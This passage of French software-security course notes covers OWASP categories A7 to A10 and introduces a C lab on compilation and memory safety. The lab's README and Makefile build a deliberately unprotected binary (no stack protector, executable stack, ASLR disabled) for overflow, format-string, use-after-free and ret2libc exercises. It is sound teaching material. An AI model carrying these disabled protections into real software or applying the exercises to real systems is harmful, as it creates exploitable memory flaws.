                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <p>Malgré des pratiques de gestion rigoureuses :</p>
                            <ul>
                                <li>
                                    <p>Les correctifs peuvent introduire des régressions.</p>
                                </li>
                                <li>
                                    <p>Certaines dépendances critiques sont difficiles à remplacer.</p>
                                </li>
                                <li>
                                    <p>Des vulnérabilités zero-day peuvent apparaître.</p>
                                </li>
                            </ul>
                            <p>La gestion des composants doit donc être <span class="em">continue et intégrée au cycle de vie applicatif</span>.</p>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>La vulnérabilité <span class="em">Vulnerable and Outdated Components</span> rappelle que la sécurité d'une application dépend aussi de son <span class="em">écosystème logiciel</span>.</p>
                            <p>Une stratégie combinant <span class="em">veille, mise à jour, inventaire et automatisation</span> est indispensable pour limiter les risques liés aux dépendances tierces.</p>
                        </li>
                    </ol>
                    <h3>A7 - Identification and Authentication Failures :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>La vulnérabilité <span class="em">Identification and Authentication Failures</span> regroupe les failles liées à une <span class="em">mauvaise gestion de l'identification des utilisateurs et des mécanismes d'authentification</span>.</p>
                            <p>Elle apparaît lorsque l'application ne permet pas de garantir correctement :</p>
                            <ul>
                                <li>
                                    <p>l'identité de l'utilisateur,</p>
                                </li>
                                <li>
                                    <p>la confidentialité des identifiants,</p>
                                </li>
                                <li>
                                    <p>la robustesse des mécanismes de connexion et de gestion de session.</p>
                                </li>
                            </ul>
                            <p>Cette catégorie inclut notamment :</p>
                            <ul>
                                <li>
                                    <p>des politiques de mots de passe faibles,</p>
                                </li>
                                <li>
                                    <p>une gestion incorrecte des sessions,</p>
                                </li>
                                <li>
                                    <p>des mécanismes d'authentification contournables,</p>
                                </li>
                                <li>
                                    <p>une absence de protection contre les attaques par force brute.</p>
                                </li>
                            </ul>
                            <p>Les erreurs de développement courantes incluent :</p>
                            <ul>
                                <li>
                                    <p>Mots de passe faibles ou non protégés.</p>
                                </li>
                                <li>
                                    <p>Absence de limitation des tentatives de connexion.</p>
                                </li>
                                <li>
                                    <p>Identifiants transmis ou stockés de manière non sécurisée.</p>
                                </li>
                                <li>
                                    <p>Tokens de session prévisibles ou non renouvelés.</p>
                                </li>
                                <li>
                                    <p>Absence d'authentification multi-facteurs.</p>
                                </li>
                            </ul>
                            <p>Les composants concernés sont principalement :</p>
                            <ul>
                                <li>
                                    <p>les systèmes d'authentification,</p>
                                </li>
                                <li>
                                    <p>la gestion des sessions,</p>
                                </li>
                                <li>
                                    <p>les mécanismes de stockage des identifiants.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Attaque par force brute sur un compte utilisateur :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>L'application ne limite pas le nombre de tentatives de connexion.</p>
                                </li>
                                <li>
                                    <p>Les mots de passe utilisateurs sont faibles.</p>
                                </li>
                                <li>
                                    <p>Aucun mécanisme de verrouillage ou d'alerte n'est en place.</p>
                                </li>
                            </ul>
                            <h6>Étapes générales :</h6>
                            <ol>
                                <li>
                                    <p>L'attaquant identifie une page de connexion accessible publiquement.</p>
                                </li>
                                <li>
                                    <p>Il lance une attaque par force brute ou par dictionnaire.</p>
                                </li>
                                <li>
                                    <p>L'application accepte un grand nombre de tentatives.</p>
                                </li>
                                <li>
                                    <p>L'attaquant devine le mot de passe valide.</p>
                                </li>
                                <li>
                                    <p>Le compte utilisateur est compromis.</p>
                                </li>
                            </ol>
                            <p>Ce scénario illustre une <span class="em">défaillance des mécanismes d'authentification</span>, conduisant à un accès non autorisé.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines d'Identification and Authentication Failures sont généralement :</p>
                            <ul>
                                <li>
                                    <p>Une mauvaise conception des mécanismes d'authentification.</p>
                                </li>
                                <li>
                                    <p>L'absence de politiques de sécurité claires sur les identifiants.</p>
                                </li>
                                <li>
                                    <p>Une gestion inadéquate des sessions.</p>
                                </li>
                                <li>
                                    <p>Une méconnaissance des attaques courantes (brute force, credential stuffing).</p>
                                </li>
                                <li>
                                    <p>Un manque de tests de sécurité spécifiques à l'authentification.</p>
                                </li>
                            </ul>
                            <p>Il s'agit à la fois d'un <span class="em">problème de conception, d'implémentation et de gouvernance</span>.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : accès non autorisé à des comptes utilisateurs.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : modification de données ou d'actions sous l'identité d'un autre utilisateur.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : verrouillage de comptes ou abus des ressources.</p>
                                </li>
                            </ul>
                            <p>L'impact global est considéré comme <span class="em">très élevé</span>, car ces vulnérabilités mènent souvent à une <span class="em">compromission complète des comptes</span>.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Appliquer des politiques de mots de passe robustes.</p>
                                </li>
                                <li>
                                    <p>Mettre en place une limitation des tentatives de connexion.</p>
                                </li>
                                <li>
                                    <p>Hacher les mots de passe avec des algorithmes adaptés (bcrypt, Argon2).</p>
                                </li>
                                <li>
                                    <p>Générer des tokens de session aléatoires et non prédictibles.</p>
                                </li>
                                <li>
                                    <p>Renouveler les identifiants de session après authentification.</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Implémenter une authentification multi-facteurs (MFA).</p>
                                </li>
                                <li>
                                    <p>Centraliser la gestion de l'authentification.</p>
                                </li>
                                <li>
                                    <p>Séparer les mécanismes d'authentification et de gestion de session.</p>
                                </li>
                                <li>
                                    <p>Forcer l'utilisation de HTTPS pour l'authentification.</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : politiques de sécurité, MFA, gestion des sessions.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : journalisation des tentatives de connexion, alertes en cas d'anomalie.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <p>Malgré la mise en place de contre-mesures efficaces :</p>
                            <ul>
                                <li>
                                    <p>Les utilisateurs peuvent choisir des mots de passe faibles.</p>
                                </li>
                                <li>
                                    <p>Les attaques par ingénierie sociale restent possibles.</p>
                                </li>
                                <li>
                                    <p>Les identifiants peuvent être compromis via des services tiers.</p>
                                </li>
                            </ul>
                            <p>La sécurité de l'authentification repose donc sur une <span class="em">combinaison de contrôles techniques et humains</span>.</p>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>Les <span class="em">Identification and Authentification Failures</span> constituent une menace majeure pour les applications modernes.</p>
                            <p>Une approche combinant <span class="em">mécanismes d'authentification robustes, bonnes pratiques de gestion des sessions et sensibilisation des utilisateurs</span> est indispensable pour réduire les risques.</p>
                        </li>
                    </ol>
                    <h3>A8 - Software and Data Integrity Failures :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>La vulnérabilité <span class="em">Software and Data Integrity Failures</span> concerne les failles liées à l'<span class="em">absence de garanties d'intégrité sur les logiciels, les mises à jour et les données critiques</span>.</p>
                            <p>Elle survient lorsque l'application :</p>
                            <ul>
                                <li>
                                    <p>ne vérifie pas l'intégrité des fichiers ou des données critiques,</p>
                                </li>
                                <li>
                                    <p>ne sécurise pas les mises à jour logicielles contre la modification malveillante,</p>
                                </li>
                                <li>
                                    <p>n'assure pas la protection contre la corruption ou l'altération des données,</p>
                                </li>
                                <li>
                                    <p>utilise des composants tiers sans vérifier leur intégrité ou leur provenance.</p>
                                </li>
                            </ul>
                            <p>Cette vulnérabilité peut conduire à des situations où un attaquant :</p>
                            <ul>
                                <li>
                                    <p>remplace ou modifie des fichiers applicatifs ou des bibliothèques,</p>
                                </li>
                                <li>
                                    <p>corrompte des données critiques dans la base de données ou les fichiers,</p>
                                </li>
                                <li>
                                    <p>installe des mises à jour compromises pouvant introduire des portes dérobées.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Compromission par mise à jour malveillante :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>L'application accepte automatiquement les mises à jour sans vérification.</p>
                                </li>
                                <li>
                                    <p>Aucun mécanisme de signature numérique ou de hachage n'est utilisé.</p>
                                </li>
                                <li>
                                    <p>Les composants tiers ne sont pas validés.</p>
                                </li>
                            </ul>
                            <h6>Étapes générales :</h6>
                            <ol>
                                <li>
                                    <p>L'attaquant modifie une mise à jour légitime ou introduit un composant malveillant.</p>
                                </li>
                                <li>
                                    <p>L'application ou le serveur télécharge et installe la mise à jour compromise.</p>
                                </li>
                                <li>
                                    <p>Le logiciel exécute du code malveillant ou corrompt des données critiques.</p>
                                </li>
                                <li>
                                    <p>L'attaquant peut obtenir un contrôle partiel ou total du système ou accéder à des informations sensibles.</p>
                                </li>
                            </ol>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines sont généralement :</p>
                            <ul>
                                <li>
                                    <p>Absence de mécanismes de contrôle d'intégrité (hash, signature numérique).</p>
                                </li>
                                <li>
                                    <p>Mauvaise gestion des mises à jour logicielles.</p>
                                </li>
                                <li>
                                    <p>Dépendances sur des composants tiers non vérifiés.</p>
                                </li>
                                <li>
                                    <p>Manque de procédures de vérification et de tests d'intégrité.</p>
                                </li>
                            </ul>
                            <p>Il s'agit d'un problème de <span class="em">conception, d'implémentation et de gouvernance</span>.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : exposition indirecte si les données corrompues permettent des fuites.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : modification ou falsification des données et du logiciel.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : dysfonctionnements ou blocage des services causés par des composants compromis.</p>
                                </li>
                            </ul>
                            <p>L'impact global est considéré comme <span class="em">élevé à critique</span>, selon la sensibilité des données ou des logiciels compromis.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Vérifier systématiquement l'intégrité des fichiers critiques et des données.</p>
                                </li>
                                <li>
                                    <p>Implémenter des signatures numériques et hachages pour toutes les mises à jour.</p>
                                </li>
                                <li>
                                    <p>Valider et contrôler toutes les entrées et composants tiers.</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Séparer les composants critiques dans des environnements sécurisés.</p>
                                </li>
                                <li>
                                    <p>Utiliser des canaux sécurisés et authentifiés pour les mises à jour logicielles.</p>
                                </li>
                                <li>
                                    <p>Mettre en place des journaux d'audit pour détecter toute altération des fichiers ou des données.</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : vérification des mises à jour, contrôle d'intégrité, surveillance des composants tiers.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : alertes sur fichiers ou données modifiés, monitoring des activités suspectes.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <ul>
                                <li>
                                    <p>Les composants externes peuvent être compromis avant leur vérification.</p>
                                </li>
                                <li>
                                    <p>Des erreurs humaines dans la gestion des clés ou certificats peuvent introduire des failles.</p>
                                </li>
                                <li>
                                    <p>Les attaques avancées exploitant des vulnérabilités inconnues restent possibles.</p>
                                </li>
                            </ul>
                            <p>La sécurité et l'intégrité reposent donc sur une <span class="em">combinaison de contrôles techniques, de processus et de sensibilisation humaine</span>.</p>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>Les <span class="em">Software and Data Integrity Failures</span> représentent une menace sérieuse pour la confiance dans les logiciels et les données critiques. Une approche combinant <span class="em">contrôles techniques robustes, vérification des composants et procédures de gouvernance</span> est essentielle pour réduire les risques.</p>
                        </li>
                    </ol>
                    <h3>A9 - Security Logging and Monitoring Failures :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>La vulnérabilité <span class="em">Security Logging and Monitoring Failures</span> concerne les failles liées à <span class="em">l'absence ou l'insuffisance de journalisation, de surveillance et d'alertes de sécurité</span>.</p>
                            <p>Elle survient lorsque l'application ne permet pas de :</p>
                            <ul>
                                <li>
                                    <p>enregistrer correctement les événements de sécurité importants,</p>
                                </li>
                                <li>
                                    <p>détecter les comportements anormaux ou malveillants,</p>
                                </li>
                                <li>
                                    <p>alerter rapidement les équipes en cas d'incident,</p>
                                </li>
                                <li>
                                    <p>analyser les attaques ou incidents après leur survenue.</p>
                                </li>
                            </ul>
                            <p>Cette catégorie inclut notamment :</p>
                            <ul>
                                <li>
                                    <p>une journalisation incomplète ou inexistante,</p>
                                </li>
                                <li>
                                    <p>des logs non protégés ou non centralisés,</p>
                                </li>
                                <li>
                                    <p>l'absence de surveillance en temps réel,</p>
                                </li>
                                <li>
                                    <p>l'absence de processus de réponse aux incidents.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Attaque prolongée non détectée :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>Les tentatives de connexion échouées ne sont pas journalisées.</p>
                                </li>
                                <li>
                                    <p>Aucun système de surveillance ou d'alerte n'est en place.</p>
                                </li>
                                <li>
                                    <p>Les logs ne sont jamais analysés.</p>
                                </li>
                            </ul>
                            <h6>Étapes générales :</h6>
                            <ol>
                                <li>
                                    <p>L'attaquant exploite une vulnérabilité de l'application.</p>
                                </li>
                                <li>
                                    <p>Il effectue plusieurs tentatives d'accès non autorisé.</p>
                                </li>
                                <li>
                                    <p>Les actions ne sont ni enregistrées ni détectées.</p>
                                </li>
                                <li>
                                    <p>L'attaquant maintient un accès prolongé au système.</p>
                                </li>
                                <li>
                                    <p>L'incident est découvert tardivement, voire jamais.</p>
                                </li>
                            </ol>
                            <p>Ce scénario illustre une <span class="em">défaillance de détection et de réaction</span>, augmentant fortement l'impact des attaques.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines sont généralement :</p>
                            <ul>
                                <li>
                                    <p>absence de stratégie de journalisation de sécurité,</p>
                                </li>
                                <li>
                                    <p>manque de sensibilisation aux besoins de surveillance,</p>
                                </li>
                                <li>
                                    <p>mauvaise configuration des logs,</p>
                                </li>
                                <li>
                                    <p>absence de processus de gestion des incidents.</p>
                                </li>
                            </ul>
                            <p>Il s'agit principalement d'un <span class="em">problème organisationnel et de gouvernance</span>, en plus des aspects techniques.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : accès non autorisé non détecté aux données sensibles.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : modifications malveillantes non identifiées.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : attaques persistantes pouvant dégrader ou interrompre les services.</p>
                                </li>
                            </ul>
                            <p>L'impact global est considéré comme <span class="em">élevé</span>, car l'absence de détection amplifie les conséquences des autres vulnérabilités.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Journaliser les événements de sécurité critiques (authentification, erreurs, accès sensibles).</p>
                                </li>
                                <li>
                                    <p>S'assurer que les logs contiennent des informations suffisantes sans exposer de données sensibles.</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Centraliser les journaux dans un système sécurisé.</p>
                                </li>
                                <li>
                                    <p>Mettre en place une surveillance en temps réel et des alertes automatisées.</p>
                                </li>
                                <li>
                                    <p>Définir des procédures de réponse aux incidents.</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : politiques de journalisation, contrôle d'accès aux logs.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : analyse des logs, alertes, tableaux de bord de sécurité.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <ul>
                                <li>
                                    <p>Un volume excessif de logs peut masquer des événements importants.</p>
                                </li>
                                <li>
                                    <p>Les attaques sophistiquées peuvent tenter d'effacer ou de contourner les journaux.</p>
                                </li>
                                <li>
                                    <p>L'efficacité dépend fortement de l'analyse humaine ou automatisée.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>Les <span class="em">Security Logging and Monitoring Failures</span> affaiblissent fortement la capacité d'une organisation à détecter et gérer les incidents. Une approche combinant <span class="em">journalisation complète, surveillance active et processus de réponse</span> est essentielle pour réduire les risques.</p>
                        </li>
                    </ol>
                    <h3>A10 - Server-Side Request Forgery (SSRF) :</h3>
                    <ol>
                        <li>
                            <h4>Présentation de la vulnérabilité :</h4>
                            <p>La vulnérabilité <span class="em">Server-Side Request Forgery (SSRF)</span> survient lorsque l'application permet à un attaquant de <span class="em">forcer le serveur à effectuer des requêtes HTTP ou réseau non prévues</span>.</p>
                            <p>Elle apparaît lorsque l'application :</p>
                            <ul>
                                <li>
                                    <p>accepte des URL fournies par l'utilisateur sans validation,</p>
                                </li>
                                <li>
                                    <p>effectue des requêtes côté serveur vers des ressources internes ou externes,</p>
                                </li>
                                <li>
                                    <p>ne restreint pas les destinations accessibles.</p>
                                </li>
                            </ul>
                            <p>Cette vulnérabilité peut permettre à un attaquant d'accéder à :</p>
                            <ul>
                                <li>
                                    <p>des services internes non exposés,</p>
                                </li>
                                <li>
                                    <p>des métadonnées cloud,</p>
                                </li>
                                <li>
                                    <p>des ressources réseau protégées.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Scénario(s) d'exploitation :</h4>
                            <h5>Scénario : Accès à des services internes via SSRF :</h5>
                            <h6>Hypothèses techniques :</h6>
                            <ul>
                                <li>
                                    <p>L'application permet de fournir une URL à charger côté serveur.</p>
                                </li>
                                <li>
                                    <p>Aucun filtrage ou liste blanche n'est appliqué.</p>
                                </li>
                                <li>
                                    <p>Le serveur a accès à des ressources internes sensibles.</p>
                                </li>
                            </ul>
                            <h5>Étapes générales :</h5>
                            <ol>
                                <li>
                                    <p>L'attaquant fournit une URL contrôlée dans une fonctionnalité de l'application.</p>
                                </li>
                                <li>
                                    <p>Le serveur exécute la requête sans validation.</p>
                                </li>
                                <li>
                                    <p>La requête cible un service interne ou une adresse réservée.</p>
                                </li>
                                <li>
                                    <p>Les informations internes sont retournées à l'attaquant.</p>
                                </li>
                            </ol>
                            <p>Ce scénario illustre une <span class="em">exposition indirecte de ressources internes</span> via le serveur applicatif.</p>
                        </li>
                        <li>
                            <h4>Causes racines :</h4>
                            <p>Les causes racines sont généralement :</p>
                            <ul>
                                <li>
                                    <p>absence de validation des URL fournies par l'utilisateur,</p>
                                </li>
                                <li>
                                    <p>mauvaise séparation entre réseau interne et externe,</p>
                                </li>
                                <li>
                                    <p>méconnaissance des risques liés aux requêtes côté serveur.</p>
                                </li>
                            </ul>
                            <p>Il s'agit principalement d'un <span class="em">problème de conception et de validation des entrées</span>.</p>
                        </li>
                        <li>
                            <h4>Impacts de sécurité :</h4>
                            <ul>
                                <li>
                                    <p><span class="em">Confidentialité</span> : accès à des données ou services internes.</p>
                                </li>
                                <li>
                                    <p><span class="em">Intégrité</span> : possibilité d'interagir avec des services internes.</p>
                                </li>
                                <li>
                                    <p><span class="em">Disponibilité</span> : exploitation pour effectuer des attaques internes ou des dénis de service.</p>
                                </li>
                            </ul>
                            <p>L'impact global peut être <span class="em">très élevé</span>, notamment dans les environnements cloud.</p>
                        </li>
                        <li>
                            <h4>Contre-mesures logicielles :</h4>
                            <h5>Niveau code :</h5>
                            <ul>
                                <li>
                                    <p>Valider strictement les URL fournies par les utilisateurs.</p>
                                </li>
                                <li>
                                    <p>Mettre en place des listes blanches de destination autorisées.</p>
                                </li>
                                <li>
                                    <p>Bloquer l'accès aux adresses internes et réservées.</p>
                                </li>
                            </ul>
                            <h5>Niveau architecture applicative :</h5>
                            <ul>
                                <li>
                                    <p>Segmenter le réseau et limiter les accès sortants du serveur.</p>
                                </li>
                                <li>
                                    <p>Désactiver l'accès aux services internes non nécessaires.</p>
                                </li>
                                <li>
                                    <p>Surveiller les requêtes sortantes.</p>
                                </li>
                            </ul>
                            <h5>Mesures préventives et détectives :</h5>
                            <ul>
                                <li>
                                    <p><span class="em">Préventives</span> : filtrage réseau, validation des entrées.</p>
                                </li>
                                <li>
                                    <p><span class="em">Détectives</span> : surveillance des requêtes sortantes et alertes.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Limites et risques résiduels :</h4>
                            <ul>
                                <li>
                                    <p>Les attaques SSRF peuvent être complexes à détecter.</p>
                                </li>
                                <li>
                                    <p>Les environnements cloud augmentent la surface d'attaque.</p>
                                </li>
                                <li>
                                    <p>Une mauvaise configuration réseau peut réintroduire le risque.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Conclusion :</h4>
                            <p>Les <span class="em">Server-Side Request Forgery (SSRF)</span> représentent une menace importante pour les architectures modernes. Une combinaison de <span class="em">validation stricte, segmentation réseau et surveillance</span> est indispensable pour limiter les risques.</p>
                        </li>
                    </ol>
                </article>
                <article>
                    <h2 id="laboC">Labo C - Compilation, édition de liens, debugging & sécurité mémoire :</h2>
                    <p>Les fichiers du Labo C sont :</p>
                    <ol>
                        <li>
                            <p>Le fichier `<span class="em">README.md</span>` est :</p>
<pre><code># Labo C - Compilation, Édition de liens, Debugging &amp; Sécurité mémoire

Ce laboratoire complet en langage C permet d'apprendre :

- Le processus de compilation (`.c &#8594; .o`)
- L'édition de liens (archives statiques `.a`, bibliothèques `.so`)
- L'analyse des binaires (`nm`, `objdump`, `readelf`, `file`)
- Le debugging avancé avec `gdb`
- L'observation des sections mémoire (stack / heap / .text / GOT / PLT)
- Les vulnérabilités mémoire :
  - Stack buffer overflow
  - Heap Use-After-Free
  - Format String
  - Overwrite de fonction (function pointer)
  - Ret2libc / ROP (initiation)
- Les mécanismes de protection :
  - ASLR, PIE
  - NX
  - Stack canaries
  - RELRO

 **IMPORTANT**  
Toutes les manipulations sont à exécuter **uniquement dans une VM isolée**.

---

# 1. Arborescence

src/
main.c
util.c / util.h
mathlib.c / mathlib.h
vuln.c / vuln.h
heap.c
fmtstr.c
Makefile

---

# 2. Compilation

## Tout compiler

Génère :

- `bin/main` : programme principal
- `bin/vuln_nosafe` : version vulnérable (sans protections)
- `lib/libmath.a` : archive statique
- `lib/libmath.so` : bibliothèque partagée

---

# 3. Utilisation

./bin/main vuln "AAAA"
./bin/main callfp
./bin/main heap "HELLO"
./bin/main fmt "%p %p %p"

Version vulnérable pour exploitation :

./bin/vuln_nosafe vuln $(python3 -c "print('A'*200)")

---

# 4. Analyse des binaires

nm -C bin/main
nm -C lib/libmath.a
readelf -h bin/main
objdump -d bin/main | less
objdump -d lib/libmath.so | less

---

# 5. Debugging GDB

gdb --args bin/main vuln AAAAAAAAAA
(gdb) break vuln_input
(gdb) run
(gdb) info frame
(gdb) disassemble
(gdb) x/40x $rsp

---

# 6. Exercices sécurité

### Buffer overflow (stack)
- Calculer l'offset jusqu'au RIP
- Overwrite du retour pour exécuter `secret_admin()`
- Comparer comportements avec / sans PIE et stack-protector

### Overwrite d'un function pointer
- Trouver l'adresse de `global_fp`
- L'écraser via un overflow

### Format String
- Lire la stack via `%p %p %p ...`
- Écrire en mémoire via `%n`

### Heap Use-After-Free
- Observer réutilisation de chunk
- Corrompre données réallouées

### Ret2libc (initiation)
- Trouver l'adresse de `system()` dans libc
- Construire un payload simple

---

# 7. Protections & durcissement

Construire un binaire protégé :

gcc -g -O2 -fstack-protector-strong -D_FORTIFY_SOURCE=2
-Wl,-z,relro,-z,now -fPIE -pie -o main_hardened src/*.c

Désactiver ASLR temporairement (root) :

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

Ou exécuter sans ASLR :

setarch uname -m -R ./bin/vuln_nosafe

---

# 8. Avertissement

Ce labo ne doit être utilisé **que pour l'apprentissage**.
Ne jamais appliquer ces techniques hors environnement autorisé.

---

# 9. Mots de l'Auteur

Labo conçu pour la formation *Software Security / Sécurité logicielle*.</code></pre>
                            <p>Un fichier <span class="em">.a</span> est une archive qui contient des objets compilés (<span class="em">.o</span>). Ces objets sont composés directement dans le binaire final au moment du linking.</p>
                            <p>Un fichier <span class="em">.so</span> (shared object) est chargé à l'exécution, pas intégré au binaire.</p>
                            <p>Pour utiliser la commande <span class="em">file</span>, soit on utilise Git Bash pour Windows ou sinon l'installe via MSYS2 avec la commande suivante :</p>
<pre><code>pacman -S file</code></pre>
                            <p>Ou alors utiliser la commande <span class="em">certutil -dump</span> dans Windows pour fournir le type MIME.</p>
                            <p>Windows n'a pas d'équivalent direct de <span class="em">readelf</span> parce qu'il n'utilise pas ELF. Mais tu peux analyser un binaire PE avec <span class="em">dumpbin</span>.</p>
                            <table class="tableBalises">
                                <thead>
                                    <tr>
                                        <th>readelf</th>
                                        <th>dumpbin</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>readelf -h</td>
                                        <td>dumpbin /headers</td>
                                    </tr>
                                    <tr>
                                        <td>readelf -s</td>
                                        <td>dumpbin /symbols</td>
                                    </tr>
                                    <tr>
                                        <td>readelf -r</td>
                                        <td>dumpbin /imports</td>
                                    </tr>
                                    <tr>
                                        <td>readelf -d</td>
                                        <td>dumpbin /exports</td>
                                    </tr>
                                </tbody>
                            </table>
<pre><code>gcc util.c -o util.o</code></pre>
                            <p>La commande précédente lance une erreur car il manque le paramètre <span class="em">-c</span> afin de compiler. Cela donne ceci :</p>
<pre><code>gcc -c util.c -o util.o</code></pre>
                        </li>
                        <li>
                            <p>Le fichier `<span class="em">Makefile</span>` est :</p>
<pre><code>CC = gcc
CFLAGS = -g -Wall -fno-omit-frame-pointer
SRC = src
OBJDIR = obj

all: bin/main bin/vuln_nosafe lib/libmath.a lib/libmath.so

$(OBJDIR):
	mkdir -p $(OBJDIR)

$(OBJDIR)/util.o: $(SRC)/util.c $(SRC)/util.h | $(OBJDIR)
	$(CC) $(CFLAGS) -c $&lt; -o $@

$(OBJDIR)/mathlib.o: $(SRC)/mathlib.c $(SRC)/mathlib.h | $(OBJDIR)
	$(CC) $(CFLAGS) -fPIC -c $&lt; -o $@

$(OBJDIR)/vuln.o: $(SRC)/vuln.c $(SRC)/vuln.h | $(OBJDIR)
	$(CC) $(CFLAGS) -c $&lt; -o $@

$(OBJDIR)/heap.o: $(SRC)/heap.c | $(OBJDIR)
	$(CC) $(CFLAGS) -c $&lt; -o $@

$(OBJDIR)/fmtstr.o: $(SRC)/fmtstr.c | $(OBJDIR)
	$(CC) $(CFLAGS) -c $&lt; -o $@

lib/libmath.a: $(OBJDIR)/mathlib.o
	mkdir -p lib
	ar rcs $@ $^

lib/libmath.so: $(SRC)/mathlib.c
	mkdir -p lib
	$(CC) -shared -fPIC -o $@ $&lt;

bin/main: $(OBJDIR)/util.o $(OBJDIR)/vuln.o $(OBJDIR)/heap.o $(OBJDIR)/fmtstr.o $(SRC)/main.c lib/libmath.a
	mkdir -p bin
	$(CC) $(CFLAGS) -no-pie -o $@ $(OBJDIR)/util.o $(OBJDIR)/vuln.o $(OBJDIR)/heap.o $(OBJDIR)/fmtstr.o $(SRC)/main.c -Llib -lmath -Wl,-rpath,'$$ORIGIN/../lib'

bin/vuln_nosafe: $(OBJDIR)/util.o $(OBJDIR)/vuln.o $(OBJDIR)/heap.o $(OBJDIR)/fmtstr.o $(SRC)/main.c lib/libmath.a
	mkdir -p bin
	$(CC) -g -fno-stack-protector -z execstack -no-pie -o $@ $(OBJDIR)/util.o $(OBJDIR)/vuln.o $(OBJDIR)/heap.o $(OBJDIR)/fmtstr.o $(SRC)/main.c -Llib -lmath -Wl,-rpath,'$$ORIGIN/../lib'

clean:
	rm -rf obj bin lib</code></pre>
                            <p>Voici quelques explications :</p>
<pre><code>CC = gcc <span class="em">&#8594; compilateur utilisé</span>
CFLAGS = -g -Wall -fno-omit-frame-pointer
<span class="em"># -g &#8594; inclut les symboles de debug</span>
<span class="em"># -Wall &#8594; active tous les warnings</span>
<span class="em"># -fno-omit-frame-pointer &#8594; nécessaire pour l'analyse en debug/gdb/exploit</span>
SRC = src <span class="em">&#8594; dossier où sont les sources</span>
OBJDIR = obj <span class="em">&#8594; dossier où seront placés les .o</span></code></pre>
                            <p><span class="em">make</span> pour construire le programme principal <span class="em">bin/main</span>, une version vulnérable <span class="em">bin/vuln_no-safe</span>, la lib statique, la lib dynamique.</p>
                            <p>Pour installer <span class="em">make</span> sur Windows, on peut utiliser la commande :</p>
<pre><code>pacman -S make</code></pre>
<pre><code>$(OBJDIR):
    mkdir -p $(OBJDIR)</code></pre>
                            <p>Make crée automatiquement le dossier obj avant de compiler.</p>
                            <p>Chaque règle compile un fichier <span class="em">.c</span> du dossier <span class="em">src/</span> en <span class="em">.o</span> dans <span class="em">obj/</span>.</p>
                            <p>L'option <span class="em">-fPIC</span> est nécessaire pour créer une bibliothèque partagée (<span class="em">.so</span>).</p>
